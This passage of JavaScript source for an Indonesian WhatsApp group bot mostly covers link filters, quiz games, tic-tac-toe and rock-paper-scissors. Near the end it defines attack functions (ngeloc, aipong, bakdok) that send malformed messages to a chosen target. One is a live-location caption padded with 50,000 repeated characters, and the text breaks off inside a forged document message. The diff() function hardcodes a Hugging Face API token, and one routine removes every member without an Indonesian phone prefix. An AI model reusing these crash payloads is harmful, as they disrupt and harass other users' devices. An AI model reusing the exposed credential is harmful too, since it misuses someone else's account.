'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=0\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
'jpegThumbnail': fakejpg,
thumbnail: fakejpg,
sendEphemeral: true
}
}
}
//=================================================//
//Reply
const joreply = async (teks) => {
await sleep(500)
let thumbnails = [nulll, nulll2]
let randomIndex = Math.floor(Math.random() * thumbnails.length)
let selectedThumbnail = thumbnails[randomIndex]
return ryozingod.sendMessage(m.chat, {
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
title: `©.`,
body: `👋`,
previewType: "VIDEO",
thumbnail: selectedThumbnail,
sourceUrl: `https://`,
mediaUrl: `https://`
}
},
text: teks
}, {
quoted: m
})
await sleep(500)
}
//=================================================//

// Anti Link
if (AntiLink) {
if (budy.toLowerCase().includes("chat.whatsapp.com/")){
if (!isBotAdmins) return joreply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await ryozingod.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return ryozingod.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return ryozingod.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isDeveloper) return ryozingod.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
}
 // Antiwame by geekz and modified by AkmalMods
if (AntiWame)
if (budy.toLowerCase().includes("wa.me")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\nAdmin sudah kirim link wa.me, admin bebas kirim link apapun`
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
kice = m.sender
await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\n@${kice.split("@")[0]} Jangan kirim wa.me link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
//antivirtex by geekz and modified by AkmalMods
  if (AntiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return joreply(mess.botAdmin)
  await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Virus Terdeteksi 」\`\`\`\n\n${pushname} Telah ditendang karena mengirim virus di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words by geekz and modified by AkmalMods
if (AntiToxic && !budy.includes("deletebadwords") && !budy.includes("delbadwords"))
if (badwords.some(word => budy.toLowerCase().includes(word))){
if (!isBotAdmins) return
bvl = `\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\nAdmin bebas menggunakan kata kasar`
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\n${pushname} Mohon tidak menggunakan kata kasar di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antiasing by geekz and modified by AkmalMods
if (m.isGroup && isBotAdmins && AntiAsing) {
let member = await participants.map((x) => x.id)
for (let i = 0; i < participants.length; i++) {
if (member[i].slice(0, 2) !== "62") {
let usersId = await participants.find((u) => u.id == member[i])
if (!usersId.groupAdmins && !isDeveloper) {
} else
await ryozingod.groupParticipantsUpdate(m.chat, [member[i]], "remove")
await sleep(1000)
}
}
}
//antilink youtube video by geekz and modified by AkmalMods
if (AntiLinkYoutubeVid)
if (budy.toLowerCase().includes("youtu.be")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YouTube Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 YouTube Video Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube video link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by geekz and modified by AkmalMods
if (AntiLinkYoutubeChannel)
if (budy.toLowerCase().includes("youtube.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YouTube Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 YouTube Channel Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube channel link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink instagram by geekz and modified by AkmalMods
if (AntiLinkInstagram)
if (budy.toLowerCase().includes("instagram.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim instagram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by geekz and modified by AkmalMods
if (AntiLinkFacebook)
if (budy.toLowerCase().includes("facebook.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim facebook link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by geekz and modified by AkmalMods
if (AntiLinkTelegram)
if (budy.toLowerCase().includes("t.me")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim telegram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by geekz and modified by AkmalMods
if (AntiLinkTiktok)
if (budy.toLowerCase().includes("tiktok.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim tiktok link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by geekz and modified by AkmalMods
if (AntiLinkTwitter)
if (budy.toLowerCase().includes("twitter.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim twitter link di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink all by geekz and modified by AkmalMods
if (AntiLinkAll)
if (budy.toLowerCase().includes("http")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
await ryozingod.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

//=================================================//

// GAME
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await joreply('*Anda Telah menyerah*')
delete tebakgambar[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await ryozingod.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
delete tebakgambar[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await joreply('*Anda Telah menyerah*')
delete kuismath[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await joreply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim math mode`)
delete kuismath[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}

if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakasahotak[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await joreply('*Anda Telah menyerah*')
delete tebakasahotak[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await ryozingod.sendText(m.chat, `🎮 Asah Otak 🎮\n\nJawaban Benar 🎉`, m)
delete tebakasahotak[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}

if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaksiapakahaku[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await joreply('*Anda Telah menyerah*')
delete tebaksiapakahaku[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await ryozingod.sendText(m.chat, `🎮 Siapakah Aku 🎮\n\nJawaban Benar 🎉`, m)
delete tebaksiapakahaku[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}

if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaksusunkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await joreply('*Anda Telah menyerah*')
delete tebaksusunkata[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await ryozingod.sendText(m.chat, `🎮 Susun Kata 🎮\n\nJawaban Benar 🎉`, m)
delete tebaksusunkata[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}

if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakbendera[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await joreply('*Anda Telah menyerah*')
delete tebakbendera[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await ryozingod.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}

if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakbendera2[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await joreply('*Anda Telah menyerah*')
delete tebakbendera2[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await ryozingod.sendText(m.chat, `🎮 Tebak Bendera 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera2[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}

if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkabupaten[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await joreply('*Anda Telah menyerah*')
delete tebakkabupaten[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await ryozingod.sendText(m.chat, `🎮 Tebak Kabupaten 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkabupaten[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}

if (tebakkimia.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkimia[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await joreply('*Anda Telah menyerah*')
delete tebakkimia[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await ryozingod.sendText(m.chat, `🎮 Tebak Kimia 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkimia[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}

if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktekateki[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await joreply('*Anda Telah menyerah*')
delete tebaktekateki[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await ryozingod.sendText(m.chat, `🎮 Teka Teki 🎮\n\nJawaban Benar 🎉`, m)
delete tebaktekateki[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await joreply('*Anda Telah menyerah*')
delete tebaklagu[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await ryozingod.sendText(m.chat, `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉`, m)
delete tebaklagu[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await joreply('*Anda Telah menyerah*')
delete tebakkata[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await ryozingod.sendText(m.chat, `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkata[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await joreply('*Anda Telah menyerah*')
delete tebakkalimat[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await ryozingod.sendText(m.chat, `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkalimat[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await joreply('*Anda Telah menyerah*')
delete tebaklirik[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await ryozingod.sendText(m.chat, `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉`, m)
delete tebaklirik[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}

if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await joreply('*Anda Telah menyerah*')
delete tebaktebakan[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await ryozingod.sendText(m.chat, `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉`, m)
delete tebaktebakan[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}

this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) {
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
joreply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
} [ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
} [v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['', ''][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
: @${room.game.playerX.split('@')[0]}
: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
if (room.x !== room.o) ryozingod.sendText(room.x, str, m, {
mentions: parseMention(str)
})
ryozingod.sendText(room.o, str, m, {
mentions: parseMention(str)
})
if (isTie || isWin) {
delete this.game[room.id]
}
}

if (m.isGroup && !m.key.fromMe) {
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let ment of mentionUser) {
if (afk.checkAfkUser(ment, _afk)) {
let getId2 = afk.getAfkId(ment, _afk)
let getReason2 = afk.getAfkReason(getId2, _afk)
let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
let heheh2 = ms(getTimee)
joreply(`Jangan tag, dia sedang afk\n\n*Reason :* ${getReason2}`)
}
}
if (afk.checkAfkUser(m.sender, _afk)) {
let getId = afk.getAfkId(m.sender, _afk)
let getReason = afk.getAfkReason(getId, _afk)
let getTime = Date.now() - afk.getAfkTime(getId, _afk)
let heheh = ms(getTime)
_afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
fs.writeFileSync('dtbs/afk-user.json', JSON.stringify(_afk))
ryozingod.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} telah kembali dari afk`, m)
}
}

let anjay = `\``

this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
ryozingod.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = m.chat
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
ryozingod.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) ryozingod.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) ryozingod.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) ryozingod.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
ryozingod.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
joreply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) ryozingod.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
joreply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) ryozingod.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
ryozingod.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}

//=================================================//
async function ssweb(url, device = 'desktop'){
return new Promise((resolve, reject) => {
const base = 'https://www.screenshotmachine.com'
const param = {
url: url,
device: device,
cacheLimit: 0
}
axios({url: base + '/capture.php',
method: 'POST',
data: new URLSearchParams(Object.entries(param)),
headers: {
'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
}
}).then((data) => {
const cookies = data.headers['set-cookie']
if (data.data.status == 'success') {
axios.get(base + '/' + data.data.link, {
headers: {
'cookie': cookies.join('')
},
responseType: 'arraybuffer'
}).then(({ data }) => {
result = {
status: 200,
result: data
}
resolve(result)
})
} else {
reject({ status: 404, statuses: `Link Error`, message: data.data })
}
}).catch(reject)
})
}

//=================================================//
async function diff(data) {
const response = await fetch(
"https://api-inference.huggingface.co/models/stablediffusionapi/lyrielv16",
{
headers: { Authorization: "Bearer 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" },
method: "POST",
body: JSON.stringify(data),
}
)
const result = await response.blob();
let arrayBuffer = await result.arrayBuffer();
const buffer = Buffer.from(arrayBuffer, 'base64')
return buffer
}

async function styletext(teks) {
return new Promise((resolve, reject) => {
axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
.then(({ data }) => {
let $ = cheerio.load(data)
let hasil = []
$('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
})
resolve(hasil)
})
})
}

//=================================================//
async function ephoto(url, texk) {
let form = new FormData()
let gT = await axios.get(url, {
headers: {
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
}
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios.post(url, form, {
headers: {
...form.getHeaders(),
Accept: "*/*",
"Accept-Language": "en-US,en;q=0.9",
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
cookie: gT.headers["set-cookie"]?.join("; "),
}
});

//=================================================//
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
headers: {
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
cookie: gT.headers["set-cookie"].join("; ")
}
})
return build_server + data.image
}
//=================================================//
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜💀᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: m.chat, quoted: kuwoted })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
}
//=================================================//
async function aipong(target) {
await ryozingod.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
